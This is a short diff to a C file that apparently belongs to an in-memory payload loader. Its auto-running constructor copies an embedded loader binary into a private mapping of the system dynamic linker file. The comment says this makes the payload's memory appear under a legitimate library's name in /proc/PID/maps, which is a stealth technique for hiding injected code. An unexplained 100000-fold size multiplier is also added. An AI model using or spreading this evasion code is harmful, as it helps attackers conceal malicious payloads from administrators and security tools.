@@ -3,6 +3,8 @@
 #include <sys/mman.h>
 #include <linux/prctl.h>
 #include <sys/prctl.h>
+#include <fcntl.h>
+#include <unistd.h>
 #include "loader/loader.h"
 
 extern char **environ;
@@ -12,13 +14,16 @@ extern char **environ;
 
 void __attribute__((constructor)) setupfun()
 {
-    unsigned int ps = PAGE_ROUND_UP(loader_bin_len);
+    unsigned int ps = PAGE_ROUND_UP(loader_bin_len)*100000;
+    /* We can just map a real binary and get its name to show up in
+     * /proc/PID/maps */
+    int fd = open("/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2", O_RDONLY);
     void *payload = mmap(
             0,
             ps,
             PROT_READ | PROT_WRITE,
-            MAP_PRIVATE | MAP_ANONYMOUS,
-            -1,
+            MAP_PRIVATE,
+            fd,
             0
         );
     memcpy(payload, loader_bin, loader_bin_len);
